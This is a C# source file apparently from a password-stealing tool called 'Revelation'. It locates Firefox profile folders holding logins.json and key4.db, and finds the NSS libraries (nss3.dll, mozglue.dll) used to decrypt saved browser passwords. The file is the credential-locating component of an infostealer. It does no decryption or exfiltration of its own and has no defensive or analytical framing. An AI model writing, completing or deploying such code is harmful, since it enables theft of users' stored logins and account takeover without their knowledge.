using System;
using System.IO;
using System.Collections.Generic;

namespace Revelation.passwords.utils_firefox
{
	class Profile
	{
		public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		private static string[] GeckoBrowsersList = new string[]
		{
			"Mozilla\\Firefox"
		};

		private static string[] Concat(string[] x, string[] y)
		{
			if (x == null) throw new ArgumentNullException("x");
			if (y == null) throw new ArgumentNullException("y");
			int oldLen = x.Length;
			Array.Resize(ref x, x.Length + y.Length);
			Array.Copy(y, 0, x, oldLen, y.Length);
			return x;
		}

		// Get program files path
		private static string[] ProgramFilesChildren()
		{
			string[] children = Directory.GetDirectories(Environment.ExpandEnvironmentVariables("%ProgramW6432%"));

			if (8 == IntPtr.Size || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))))
			{
				children = Concat(children, Directory.GetDirectories(Environment.ExpandEnvironmentVariables("%ProgramFiles(x86)%")));
			}

			return children;
		}

		// Get profile directory location
		public static string GetProfile(string path)
		{
			try
			{
				string dir = Path.Combine(path, "Profiles");
				if (Directory.Exists(dir))
					foreach (string sDir in Directory.GetDirectories(dir))
						if (File.Exists(sDir + "\\logins.json") ||
							File.Exists(sDir + "\\key4.db") ||
							File.Exists(sDir + "\\places.sqlite"))
							return sDir;
			}
			catch (Exception ex) { Console.WriteLine("Failed to find profile\n" + ex); }
			return null;
		}

		// Get directory with nss3.dll
		public static string GetMozillaPath()
		{
			foreach (string sDir in ProgramFilesChildren())
			{
				if (File.Exists(sDir + "\\nss3.dll") &&
					File.Exists(sDir + "\\mozglue.dll"))
					return sDir;
			}
			return null;
		}

		// Get gecko based browsers path
		public static string GetMozillaBrowser()
		{
			var result = "";
			string bdir = Path.Combine(Appdata, "Mozilla\\Firefox");
			if (Directory.Exists(bdir))
			{
				result = bdir;
			}
			
			return result;
		}
	}
}
